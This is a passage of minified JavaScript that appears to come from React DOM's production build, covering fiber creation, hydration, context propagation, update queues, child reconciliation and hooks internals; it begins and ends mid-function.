Rr(e){if(50<Oi)throw Oi=0,xs=null,Error(o(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var ol={};function cy(e,t,a,n){this.tag=e,this.key=a,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=n,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function vt(e,t,a,n){return new cy(e,t,a,n)}function Lc(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Ea(e,t){var a=e.alternate;return a===null?(a=vt(e.tag,t,e.key,e.mode),a.elementType=e.elementType,a.type=e.type,a.stateNode=e.stateNode,a.alternate=e,e.alternate=a):(a.pendingProps=t,a.type=e.type,a.flags=0,a.subtreeFlags=0,a.deletions=null),a.flags=e.flags&1206910976,a.childLanes=e.childLanes,a.lanes=e.lanes,a.child=e.child,a.memoizedProps=e.memoizedProps,a.memoizedState=e.memoizedState,a.updateQueue=e.updateQueue,t=e.dependencies,a.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},a.sibling=e.sibling,a.index=e.index,a.ref=e.ref,a.refCleanup=e.refCleanup,a}function Md(e,t){e.flags&=1206910978;var a=e.alternate;return a===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=a.childLanes,e.lanes=a.lanes,e.child=a.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=a.memoizedProps,e.memoizedState=a.memoizedState,e.updateQueue=a.updateQueue,e.type=a.type,t=a.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function Dr(e,t,a,n,i,s){var u=0;if(n=e,typeof n=="function")Lc(n)&&(u=1);else if(typeof n=="string")u=Hb(e,a,ta.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(n){case Kt:return e=vt(31,a,t,i),e.elementType=Kt,e.lanes=s,e;case te:return wn(a.children,i,s,t);case le:u=8,i|=24;break;case be:return e=vt(12,a,t,i|2),e.elementType=be,e.lanes=s,e;case F:return e=vt(13,a,t,i),e.elementType=F,e.lanes=s,e;case ae:return e=vt(19,a,t,i),e.elementType=ae,e.lanes=s,e;case ya:case E:return e=i|32,e=vt(30,a,t,e),e.elementType=E,e.lanes=s,e.stateNode={autoName:null,paired:null,clones:null,ref:null},e;default:if(typeof n=="object"&&n!==null)switch(n.$$typeof){case _e:u=10;break e;case Xe:u=9;break e;case k:u=11;break e;case Ce:u=14;break e;case je:u=16,n=null;break e}u=29,a=Error(o(130,e===null?"null":typeof e,"")),n=null}return t=vt(u,a,t,i),t.elementType=e,t.type=n,t.lanes=s,t}function wn(e,t,a,n){return e=vt(7,e,n,t),e.lanes=a,e}function Gc(e,t,a){return e=vt(6,e,null,t),e.lanes=a,e}function Hd(e){var t=vt(18,null,null,0);return t.stateNode=e,t}function qc(e,t,a){return t=vt(4,e.children!==null?e.children:[],e.key,t),t.lanes=a,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var Bd=new WeakMap;function kt(e,t){if(typeof e=="object"&&e!==null){var a=Bd.get(e);return a!==void 0?a:(t={value:e,source:t,stack:Of(t)},Bd.set(e,t),t)}return{value:e,source:t,stack:Of(t)}}var ul=[],fl=0,Ur=null,ui=0,Lt=[],Gt=0,Ya=null,na=1,la="";function Aa(e,t){ul[fl++]=ui,ul[fl++]=Ur,Ur=e,ui=t}function kd(e,t,a){Lt[Gt++]=na,Lt[Gt++]=la,Lt[Gt++]=Ya,Ya=e;var n=na;e=la;var i=32-Et(n)-1;n&=~(1<<i),a+=1;var s=32-Et(t)+i;if(30<s){var u=i-i%5;s=(n&(1<<u)-1).toString(32),n>>=u,i-=u,na=1<<32-Et(t)+i|a<<i|n,la=s+e}else na=1<<s|a<<i|n,la=e}function Mr(e){e.return!==null&&(Aa(e,1),kd(e,1,0))}function Yc(e){for(;e===Ur;)Ur=ul[--fl],ul[fl]=null,ui=ul[--fl],ul[fl]=null;for(;e===Ya;)Ya=Lt[--Gt],Lt[Gt]=null,la=Lt[--Gt],Lt[Gt]=null,na=Lt[--Gt],Lt[Gt]=null}function Ld(e,t){Lt[Gt++]=na,Lt[Gt++]=la,Lt[Gt++]=Ya,na=t.id,la=t.overflow,Ya=e}var Pe=null,He=null,ue=!1,Za=null,qt=!1,Zc=Error(o(519));function Xa(e){var t=Error(o(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw fi(kt(t,e)),Zc}function Gd(e){var t=e.stateNode,a=e.type,n=e.memoizedProps;switch(t[at]=e,t[gt]=n,a){case"dialog":de("cancel",t),de("close",t);break;case"iframe":case"object":case"embed":de("load",t);break;case"video":case"audio":for(a=0;a<Di.length;a++)de(Di[a],t);break;case"source":de("error",t);break;case"img":case"image":case"link":de("error",t),de("load",t);break;case"details":de("toggle",t);break;case"input":de("invalid",t),$f(t,n.value,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name,!0);break;case"select":de("invalid",t);break;case"textarea":de("invalid",t),ed(t,n.value,n.defaultValue,n.children)}a=n.children,typeof a!="string"&&typeof a!="number"&&typeof a!="bigint"||t.textContent===""+a||n.suppressHydrationWarning===!0||sp(t.textContent,a)?(n.popover!=null&&(de("beforetoggle",t),de("toggle",t)),n.onScroll!=null&&de("scroll",t),n.onScrollEnd!=null&&de("scrollend",t),n.onClick!=null&&(t.onclick=aa),t=!0):t=!1,t||Xa(e,!0)}function Hr(e){for(Pe=e.return;Pe;)switch(Pe.tag){case 5:case 31:case 13:qt=!1;return;case 27:case 3:qt=!0;return;default:Pe=Pe.return}}function dl(e){if(e!==Pe)return!1;if(!ue)return Hr(e),ue=!0,!1;var t=e.tag,a;if((a=t!==3&&t!==27)&&((a=t===5)&&(a=e.type,a=!(a!=="form"&&a!=="button")||_u(e.type,e.memoizedProps)),a=!a),a&&He&&Xa(e),Hr(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(o(317));He=Ap(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(o(317));He=Ap(e)}else t===27?(t=He,sn(e.type)?(e=Cu,Cu=null,He=e):He=t):He=Pe?Zt(e.stateNode.nextSibling):null;return!0}function En(){He=Pe=null,ue=!1}function Xc(){var e=Za;return e!==null&&(_t===null?_t=e:_t.push.apply(_t,e),Za=null),e}function fi(e){Za===null?Za=[e]:Za.push(e)}var Vc=ea(null),An=null,ja=null;function Va(e,t,a){Me(Vc,t._currentValue),t._currentValue=a}function Na(e){e._currentValue=Vc.current,tt(Vc)}function Br(e,t,a){for(;e!==null;){var n=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,n!==null&&(n.childLanes|=t)):n!==null&&(n.childLanes&t)!==t&&(n.childLanes|=t),e===a)break;e=e.return}}function Qc(e,t,a,n){var i=e.child;for(i!==null&&(i.return=e);i!==null;){var s=i.dependencies;if(s!==null){var u=i.child;s=s.firstContext;e:for(;s!==null;){var h=s;s=i;for(var x=0;x<t.length;x++)if(h.context===t[x]){s.lanes|=a,h=s.alternate,h!==null&&(h.lanes|=a),Br(s.return,a,e),n||(u=null);break e}s=h.next}}else if(i.tag===18){if(u=i.return,u===null)throw Error(o(341));u.lanes|=a,s=u.alternate,s!==null&&(s.lanes|=a),Br(u,a,e),u=null}else i.tag===13&&i.memoizedState!==null&&i.memoizedState.dehydrated===null?(i.lanes|=a,u=i.alternate,u!==null&&(u.lanes|=a),Br(i.return,a,e),u=i.child,u=u!==null?u.sibling:null):u=i.child;if(u!==null)u.return=i;else for(u=i;u!==null;){if(u===e){u=null;break}if(i=u.sibling,i!==null){i.return=u.return,u=i;break}u=u.return}i=u}}function jn(e,t,a,n){e=null;for(var i=t,s=!1;i!==null;){if(!s){if((i.flags&524288)!==0)s=!0;else if((i.flags&262144)!==0)break}if(i.tag===10){var u=i.alternate;if(u===null)throw Error(o(387));if(u=u.memoizedProps,u!==null){var h=i.type;jt(i.pendingProps.value,u.value)||(e!==null?e.push(h):e=[h])}}else if(i===ur.current){if(u=i.alternate,u===null)throw Error(o(387));u.memoizedState.memoizedState!==i.memoizedState.memoizedState&&(e!==null?e.push(Bl):e=[Bl])}i=i.return}return e!==null&&Qc(t,e,a,n),t.flags|=262144,e!==null}function kr(e){for(e=e.firstContext;e!==null;){if(!jt(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function Nn(e){An=e,ja=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function nt(e){return qd(An,e)}function Lr(e,t){return An===null&&Nn(e),qd(e,t)}function qd(e,t){var a=t._currentValue;if(t={context:t,memoizedValue:a,next:null},ja===null){if(e===null)throw Error(o(308));ja=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else ja=ja.next=t;return a}var oy=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(a,n){e.push(n)}};this.abort=function(){t.aborted=!0,e.forEach(function(a){return a()})}},uy=l.unstable_scheduleCallback,fy=l.unstable_NormalPriority,Ve={$$typeof:_e,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function Kc(){return{controller:new oy,data:new Map,refCount:0}}function di(e){e.refCount--,e.refCount===0&&uy(fy,function(){e.controller.abort()})}function Yd(e,t){if((e.pendingLanes&4194048)!==0){var a=e.transitionTypes;for(a===null&&(a=e.transitionTypes=[]),e=0;e<t.length;e++){var n=t[e];a.indexOf(n)===-1&&a.push(n)}}}var hi=null;function dy(e){var t=e.transitionTypes;return e.transitionTypes=null,t}var pi=null,Ic=0,Cn=0,hl=null;function hy(e,t){if(pi===null){var a=pi=[];Ic=0,Cn=fu(),hl={status:"pending",value:void 0,then:function(n){a.push(n)}}}return Ic++,t.then(Zd,Zd),t}function Zd(){if(--Ic===0&&(hi=null,pi!==null)){hl!==null&&(hl.status="fulfilled");var e=pi;pi=null,Cn=0,hl=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function py(e,t){var a=[],n={status:"pending",value:null,reason:null,then:function(i){a.push(i)}};return e.then(function(){n.status="fulfilled",n.value=t;for(var i=0;i<a.length;i++)(0,a[i])(t)},function(i){for(n.status="rejected",n.reason=i,i=0;i<a.length;i++)(0,a[i])(void 0)}),n}var Xd=I.S;I.S=function(e,t){if(H0=Tt(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&hy(e,t),hi!==null)for(var a=Ol;a!==null;)Yd(a,hi),a=a.next;if(a=e.types,a!==null){for(var n=Ol;n!==null;)Yd(n,a),n=n.next;if(Cn!==0){n=hi,n===null&&(n=hi=[]);for(var i=0;i<a.length;i++){var s=a[i];n.indexOf(s)===-1&&n.push(s)}}}Xd!==null&&Xd(e,t)};var zn=ea(null);function Fc(){var e=zn.current;return e!==null?e:Ue.pooledCache}function Gr(e,t){t===null?Me(zn,zn.current):Me(zn,t.pool)}function Vd(){var e=Fc();return e===null?null:{parent:Ve._currentValue,pool:e}}var pl=Error(o(460)),Jc=Error(o(474)),qr=Error(o(542)),Yr={then:function(){}};function Qd(e){return e=e.status,e==="fulfilled"||e==="rejected"}function Kd(e,t,a){switch(a=e[a],a===void 0?e.push(t):a!==t&&(t.then(aa,aa),t=a),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Fd(e),e===void 0&&!("reason"in t)?Error(o(600)):e;default:if(typeof t.status=="string")t.then(aa,aa);else{if(e=Ue,e!==null&&100<e.shellSuspendCounter)throw Error(o(482));e=t,e.status="pending",e.then(function(n){if(t.status==="pending"){var i=t;i.status="fulfilled",i.value=n}},function(n){if(t.status==="pending"){var i=t;i.status="rejected",i.reason=n}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,Fd(e),e}throw Rn=t,pl}}function On(e){try{var t=e._init;return t(e._payload)}catch(a){throw a!==null&&typeof a=="object"&&typeof a.then=="function"?(Rn=a,pl):a}}var Rn=null;function Id(){if(Rn===null)throw Error(o(459));var e=Rn;return Rn=null,e}function Fd(e){if(e===pl||e===qr)throw Error(o(483))}var ml=null,mi=0;function Zr(e){var t=mi;return mi+=1,ml===null&&(ml=[]),Kd(ml,e,t)}function Qa(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function Xr(e,t){throw t.$$typeof===X?Error(o(525)):(e=Object.prototype.toString.call(t),Error(o(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function Jd(e){function t(j,S){if(e){var C=j.deletions;C===null?(j.deletions=[S],j.flags|=16):C.push(S)}}function a(j,S){if(!e)return null;for(;S!==null;)t(j,S),S=S.sibling;return null}function n(j){for(var S=new Map;j!==null;)j.key===null?S.set(j.index,j):S.set(j.key,j),j=j.sibling;return S}function i(j,S){return j=Ea(j,S),j.index=0,j.sibling=null,j}function s(j,S,C){return j.index=C,e?(C=j.alternate,C!==null?(C=C.index,C<S?(j.flags|=2,S):C):(j.flags|=134217730,S)):(j.flags|=1048576,S)}function u(j){return e&&j.alternate===null&&(j.flags|=134217730),j}function h(j,S,C,R){return S===null||S.tag!==6?(S=Gc(C,j.mode,R),S.return=j,S):(S=i(S,C),S.return=j,S)}function x(j,S,C,R){var Y=C.type;return Y===te?(j=O(j,S,C.props.children,R,C.key),Qa(j,C),j):S!==null&&(S.elementType===Y||typeof Y=="object"&&Y!==null&&Y.$$typeof===je&&On(Y)===S.type)?(S=i(S,C.props),Qa(S,C),S.return=j,S):(S=Dr(C.type,C.key,C.props,null,j.mode,R),Qa(S,C),S.return=j,S)}function N(j,S,C,R){return S===null||S.tag!==4||S.stateNode.containerInfo!==C.containerInfo||S.stateNode.implementation!==C.implementation?(S=qc(C,j.mode,R),S.return=j,S):(S=i(S,C.children||[]),S.return=j,S)}function O(j,S,C,R,Y){return S===null||S.tag!==7?(S=wn(C,j.mode,R,Y),S.return=j,S):(S=i(S,C),S.return=j,S)}function D(j,S,C){if(typeof S=="string"&&S!==""||typeof S=="number"||typeof S=="bigint")return S=Gc(""+S,j.mode,C),S.return=j,S;if(typeof S=="object"&&S!==null){switch(S.$$typeof){case ie:return C=Dr(S.type,S.key,S.props,null,j.mode,C),Qa(C,S),C.return=j,C;case K:return S=qc(S,j.mode,C),S.return=j,S;case je:return S=On(S),D(j,S,C)}if(we(S)||$(S))return S=wn(S,j.mode,C,null),S.return=j,S;if(typeof S.then=="function")return D(j,Zr(S),C);if(S.$$typeof===_e)return D(j,Lr(j,S),C);Xr(j,S)}return null}function A(j,S,C,R){var Y=S!==null?S.key:null;if(typeof C=="string"&&C!==""||typeof C=="number"||typeof C=="bigint")return Y!==null?null:h(j,S,""+C,R);if(typeof C=="object"&&C!==null){switch(C.$$typeof){case ie:return C.key===Y?x(j,S,C,R):null;case K:return C.key===Y?N(j,S,C,R):null;case je:return C=On(C),A(j,S,C,R)}if(we(C)||$(C))return Y!==null?null:O(j,S,C,R,null);if(typeof C.then=="function")return A(j,S,Zr(C),R);if(C.$$typeof===_e)return A(j,S,Lr(j,C),R);Xr(j,C)}return null}function z(j,S,C,R,Y){if(typeof R=="string"&&R!==""||typeof R=="number"||typeof R=="bigint")return j=j.get(C)||null,h(S,j,""+R,Y);if(typeof R=="object"&&R!==null){switch(R.$$typeof){case ie:return j=j.get(R.key===null?C:R.key)||null,x(S,j,R,Y);case K:return j=j.get(R.key===null?C:R.key)||null,N(S,j,R,Y);case je:return R=On(R),z(j,S,C,R,Y)}if(we(R)||$(R))return j=j.get(C)||null,O(S,j,R,Y,null);if(typeof R.then=="function")return z(j,S,C,Zr(R),Y);if(R.$$typeof===_e)return z(j,S,C,Lr(S,R),Y);Xr(S,R)}return null}function L(j,S,C,R){for(var Y=null,me=null,J=S,ne=S=0,Ie=null;J!==null&&ne<C.length;ne++){J.index>ne?(Ie=J,J=null):Ie=J.sibling;var ve=A(j,J,C[ne],R);if(ve===null){J===null&&(J=Ie);break}e&&J&&ve.alternate===null&&t(j,J),S=s(ve,S,ne),me===null?Y=ve:me.sibling=ve,me=ve,J=Ie}if(ne===C.length)return a(j,J),ue&&Aa(j,ne),Y;if(J===null){for(;ne<C.length;ne++)J=D(j,C[ne],R),J!==null&&(S=s(J,S,ne),me===null?Y=J:me.sibling=J,me=J);return ue&&Aa(j,ne),Y}for(J=n(J);ne<C.length;ne++)Ie=z(J,j,ne,C[ne],R),Ie!==null&&(e&&(ve=Ie.alternate,ve!==null&&J.delete(ve.key===null?ne:ve.key)),S=s(Ie,S,ne),me===null?Y=Ie:me.sibling=Ie,me=Ie);return e&&J.forEach(function(dn){return t(j,dn)}),ue&&Aa(j,ne),Y}function Z(j,S,C,R){if(C==null)throw Error(o(151));for(var Y=null,me=null,J=S,ne=S=0,Ie=null,ve=C.next();J!==null&&!ve.done;ne++,ve=C.next()){J.index>ne?(Ie=J,J=null):Ie=J.sibling;var dn=A(j,J,ve.value,R);if(dn===null){J===null&&(J=Ie);break}e&&J&&dn.alternate===null&&t(j,J),S=s(dn,S,ne),me===null?Y=dn:me.sibling=dn,me=dn,J=Ie}if(ve.done)return a(j,J),ue&&Aa(j,ne),Y;if(J===null){for(;!ve.done;ne++,ve=C.next())ve=D(j,ve.value,R),ve!==null&&(S=s(ve,S,ne),me===null?Y=ve:me.sibling=ve,me=ve);return ue&&Aa(j,ne),Y}for(J=n(J);!ve.done;ne++,ve=C.next())ve=z(J,j,ne,ve.value,R),ve!==null&&(e&&(Ie=ve.alternate,Ie!==null&&J.delete(Ie.key===null?ne:Ie.key)),S=s(ve,S,ne),me===null?Y=ve:me.sibling=ve,me=ve);return e&&J.forEach(function(Ib){return t(j,Ib)}),ue&&Aa(j,ne),Y}function oe(j,S,C,R){if(typeof C=="object"&&C!==null&&C.type===te&&C.key===null&&C.props.ref===void 0&&(C=C.props.children),typeof C=="object"&&C!==null){switch(C.$$typeof){case ie:e:{for(var Y=C.key;S!==null;){if(S.key===Y){if(Y=C.type,Y===te){if(S.tag===7){a(j,S.sibling),R=i(S,C.props.children),Qa(R,C),R.return=j,j=R;break e}}else if(S.elementType===Y||typeof Y=="object"&&Y!==null&&Y.$$typeof===je&&On(Y)===S.type){a(j,S.sibling),R=i(S,C.props),Qa(R,C),R.return=j,j=R;break e}a(j,S);break}else t(j,S);S=S.sibling}C.type===te?(R=wn(C.props.children,j.mode,R,C.key),Qa(R,C),R.return=j,j=R):(R=Dr(C.type,C.key,C.props,null,j.mode,R),Qa(R,C),R.return=j,j=R)}return u(j);case K:e:{for(Y=C.key;S!==null;){if(S.key===Y)if(S.tag===4&&S.stateNode.containerInfo===C.containerInfo&&S.stateNode.implementation===C.implementation){a(j,S.sibling),R=i(S,C.children||[]),R.return=j,j=R;break e}else{a(j,S);break}else t(j,S);S=S.sibling}R=qc(C,j.mode,R),R.return=j,j=R}return u(j);case je:return C=On(C),oe(j,S,C,R)}if(we(C))return L(j,S,C,R);if($(C)){if(Y=$(C),typeof Y!="function")throw Error(o(150));return C=Y.call(C),Z(j,S,C,R)}if(typeof C.then=="function")return oe(j,S,Zr(C),R);if(C.$$typeof===_e)return oe(j,S,Lr(j,C),R);Xr(j,C)}return typeof C=="string"&&C!==""||typeof C=="number"||typeof C=="bigint"?(C=""+C,S!==null&&S.tag===6?(a(j,S.sibling),R=i(S,C),R.return=j,j=R):(a(j,S),R=Gc(C,j.mode,R),R.return=j,j=R),u(j)):a(j,S)}return function(j,S,C,R){try{mi=0;var Y=oe(j,S,C,R);return ml=null,Y}catch(J){if(J===pl||J===qr)throw J;var me=vt(29,J,null,j.mode);return me.lanes=R,me.return=j,me}finally{}}}var Dn=Jd(!0),Pd=Jd(!1),Ka=!1;function Pc(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function $c(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function Ia(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function Fa(e,t,a){var n=e.updateQueue;if(n===null)return null;if(n=n.shared,(Ee&2)!==0){var i=n.pending;return i===null?t.next=t:(t.next=i.next,i.next=t),n.pending=t,t=Rr(e),Ud(e,null,a),t}return Or(e,n,t,a),Rr(e)}function gi(e,t,a){if(t=t.updateQueue,t!==null&&(t=t.shared,(a&4194048)!==0)){var n=t.lanes;n&=e.pendingLanes,a|=n,t.lanes=a,kf(e,a)}}function Wc(e,t){var a=e.updateQueue,n=e.alternate;if(n!==null&&(n=n.updateQueue,a===n)){var i=null,s=null;if(a=a.firstBaseUpdate,a!==null){do{var u={lane:a.lane,tag:a.tag,payload:a.payload,callback:null,next:null};s===null?i=s=u:s=s.next=u,a=a.next}while(a!==null);s===null?i=s=t:s=s.next=t}else i=s=t;a={baseState:n.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:n.shared,callbacks:n.callbacks},e.updateQueue=a;return}e=a.lastBaseUpdate,e===null?a.firstBaseUpdate=t:e.next=t,a.lastBaseUpdate=t}var eo=!1;function vi(){if(eo){var e=hl;if(e!==null)throw e}}function yi(e,t,a,n){eo=!1;var i=e.updateQueue;Ka=!1;var s=i.firstBaseUpdate,u=i.lastBaseUpdate,h=i.shared.pending;if(h!==null){i.shared.pending=null;var x=h,N=x.next;x.next=null,u===null?s=N:u.next=N,u=x;var O=e.alternate;O!==null&&(O=O.updateQueue,h=O.lastBaseUpdate,h!==u&&(h===null?O.firstBaseUpdate=N:h.next=N,O.lastBaseUpdate=x))}if(s!==null){var D=i.baseState;u=0,O=N=x=null,h=s;do{var A=h.lane&-536870913,z=A!==h.lane;if(z?(pe&A)===A:(n&A)===A){A!==0&&A===Cn&&(eo=!0),O!==null&&(O=O.next={lane:0,tag:h.tag,payload:h.payload,callback:null,next:null});e:{var L=e,Z=h;A=t;var oe=a;switch(Z.tag){case 1:if(L=Z.payload,typeof L=="function"){D=L.call(oe,D,A);break e}D=L;break e;case 3:L.flags=L.flags&-65537|128;case 0:if(L=Z.payload,A=typeof L=="function"?L.call(oe,D,A):L,A==null)break e;D=B({},D,A);break e;case 2:Ka=!0}}A=h.callback,A!==null&&(e.flags|=64,z&&(e.flags|=8192),z=i.callbacks,z===null?i.callbacks=[A]:z.push(A))}else z={lane:A,tag:h.tag,payload:h.payload,callback:h.callback,next:null},O===null?(N=O=z,x=D):O=O.next=z,u|=A;if(h=h.next,h===null){if(h=i.shared.pending,h===null)break;z=h,h=z.next,z.next=null,i.lastBaseUpdate=z,i.shared.pending=null}}while(!0);O===null&&(x=D),i.baseState=x,i.firstBaseUpdate=N,i.lastBaseUpdate=O,s===null&&(i.shared.lanes=0),an|=u,e.lanes=u,e.memoizedState=D}}function $d(e,t){if(typeof e!="function")throw Error(o(191,e));e.call(t)}function Wd(e,t){var a=e.callbacks;if(a!==null)for(e.callbacks=null,e=0;e<a.length;e++)$d(a[e],t)}var Ja=ea(null),Vr=ea(0);function eh(e,t){e=Da,Me(Vr,e),Me(Ja,t),Da=e|t.baseLanes}function to(){Me(Vr,Da),Me(Ja,Ja.current)}function ao(){Da=Vr.current,tt(Ja),tt(Vr)}var lt=ea(null),ut=null;function Pa(e){var t=e.alternate;Me(it,it.current&1),Me(lt,e),ut===null&&(t===null||Ja.current!==null||t.memoizedState!==null)&&(ut=e)}function no(e){Me(it,it.current),Me(lt,e),ut===null&&(ut=e)}function th(e){e.tag===22?(Me(it,it.current),Me(lt,e),ut===null&&(ut=e)):$a()}function $a(){Me(it,it.current),Me(lt,lt.current)}function Nt(e){tt(lt),ut===e&&(ut=null),tt(it)}var it=ea(0);function bi(e,t){Me(lt,lt.current),Me(it,t)}function lo(e){tt(it),tt(lt),ut===e&&(ut=null)}function Qr(e){for(var t=e;t!==null;){if(t.tag===13){var a=t.memoizedState;if(a!==null&&(a=a.dehydrated,a===null||ju(a)||Nu(a)))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!=="independent"){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Ca=0,ce=null,De=null,Qe=null,Kr=!1,gl=!1,Un=!1,Ir=0,_i=0,vl=null,my=0;function qe(){throw Error(o(321))}function io(e,t){if(t===null)return!1;for(var a=0;a<t.length&&a<e.length;a++)if(!jt(e[a],t[a]))return!1;return!0}function ro(e,t,a,n,i,s){return Ca=s,ce=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,I.H=e===null||e.memoizedState===null?kh:Lh,Un=!1,s=a(n,i),Un=!1,gl&&(s=nh(t,a,n,i)),ah(e),s}function ah(e){I.H=ts;var t=De!==null&&De.next!==null;if(Ca=0,Qe=De=ce=null,Kr=!1,_i=0,vl=null,t)throw Error(o(300));e===null||Ke||(e=e.dependencies,e!==null&&kr(e)&&(Ke=!0))}function nh(e,t,a,n){ce=e;var i=0;do{if(gl&&(vl=null),_i=0,gl=!1,25<=i)throw Error(o(301));if(i+=1,Qe=De=null,e.updateQueue!=null){var s=e.updateQueue;s.lastEffect=null,s.events=null,s.stores=null,s.memoCache!=null&&(s.memoCache.index=0)}I.H=Ty,s=t(a,n)}while(gl);return s}function gy(){var e=I.H,t=e.useState()[0];return t=typeof t.then=="function"?xi(t):t,e=e.useState()[0],(De!==null?De.memoizedState:null)!==e&&(ce.flags|=1024),t}function so(){var e=Ir!==0;return Ir=0,e}function co(e,t,a){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a}function oo(e){if(Kr){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}Kr=!1}Ca=0,Qe=De=ce=null,gl=!1,_i=Ir=0,vl=null}function dt(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Qe===null?ce.memoizedState=Qe=e:Qe=Qe.next=e,Qe}function Ze(){if(De===null){var e=ce.alternate;e=e!==null?e.memoizedState:null}else e=De.next;var t=Qe===null?ce.memoizedState:Qe.next;if(t!==null)Qe=t,De=e;else{if(e===null)throw ce.alternate===null?Error(o(467)):Error(o(310));De=e,e={memoizedState:De.memoizedState,baseState:De.baseState,baseQueue:De.baseQueue,queue:De.queue,next:null},Qe===null?ce.memoizedState=Qe=e:Qe=Qe.next=e}return Qe}function Fr(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function xi(e){var t=_i;return _i+=1,vl===null&&(vl=[]),e=Kd(vl,e,t),t=ce,(Qe===null?t.memoizedState:Qe.next)===null&&(t=t.alternate,I.H=t===null||t.memoizedState===null?kh:Lh),e}function Jr(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return xi(e);if(e.$$typeof===H)return;if(e.$$typeof===_e)return nt(e)}throw Error(o(438,String(e)))}function uo(e){var t=null,a=ce.updateQueue;if(a!==null&&(t=a.memoCache),t==null){var n=ce.alternate;n!==null&&(n=n.updateQueue,n!==null&&(n=n.memoCache,n!=null&&(t={data:n.data.map(function(i){return i.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),a===null&&(a=Fr(),ce.updateQueue=a),a.memoCache=t,a=t.data[t.index],a===void 0)for(a=t.data[t.index]=Array(e),n=0;n<e;n++)a[n]=vn;return t.index++,a}function za(e,t){return typeof t=="function"?t(e):t}function Pr(e){var t=Ze();return fo(t,De,e)}function fo(e,t,a){var n=e.queue;if(n===null)throw Error(o(311));n.lastRenderedReducer=a;var i=e.baseQueue,s=n.pending;if(s!==null){if(i!==null){var u=i.next;i.next=s.next,s.next=u}t.baseQueue=i=s,n.pending=null}if(s=e.baseState,i===null)e.memoizedState=s;else{t=i.next;var h=u=null,x=null,N=t,O=!1;do{var D=N.lane&-536870913;if(D!==N.lane?(pe&D)===D:(Ca&D)===D){var A=N.revertLane;if(A===0)x!==null&&(x=x.next={lane:0,revertLane:0,gesture:null,action:N.action,hasEagerState:N.hasEagerState,eagerState:N.eagerState,next:null}),D===Cn&&(O=!0);else if((Ca&A)===A){N=N.next,A===Cn&&(O=!0);continue}else D={lane:0,revertLane:N.revertLane,gesture:null,action:N.action,hasEagerState:N.hasEagerState,eagerState:N.eagerState,next:null},x===null?(h=x=D,u=s):x=x.next=D,ce.lanes|=A,an|=A;D=N.action,Un&&a(s,D),s=N.hasEagerState?N.eagerState:a(s,D)}else A={lane:D,revertLane:N.revertLane,gesture:N.gesture,action:N.action,hasEagerState:N.hasEagerState,eagerState:N.eagerState,next:null},x===null?(h=x=A,u=s):x=x.next=A,ce.lanes|=D,an|=D;N=N.next}while(N!==null&&N!==t);if(x===null?u=s:x.next=h,!jt(s,e.memoizedState)&&(Ke=!0,O&&(a=hl,a!==null)))throw a;e.memoizedState=s,e.baseState=u,e.baseQueue=x,n.lastRenderedState=s}return i===null&&(n.lanes=0),[e.memoizedState,n.dispatch]}function ho(e){var t=Ze(),a=t.queue;if(a===null)throw Error(o(311));a.lastRenderedReducer=e;var n=a.dispatch,i=a.pending,s=t.memoizedState;if(i!==null){a.pending=null;var u=i=i.next;do s=e(s,u.action),u=u.next;while(u!==i);jt(s,t.memoizedState)||(Ke=!0),t.memoizedState=s,t.baseQueue===null&&(t.baseState=s),a.lastRenderedState=s}return[s,n]}function lh(e,t,a){var n=ce,i=Ze(),s=ue;if(s){if(a===void 0)throw Error(o(407));a=a()}else a=t();var 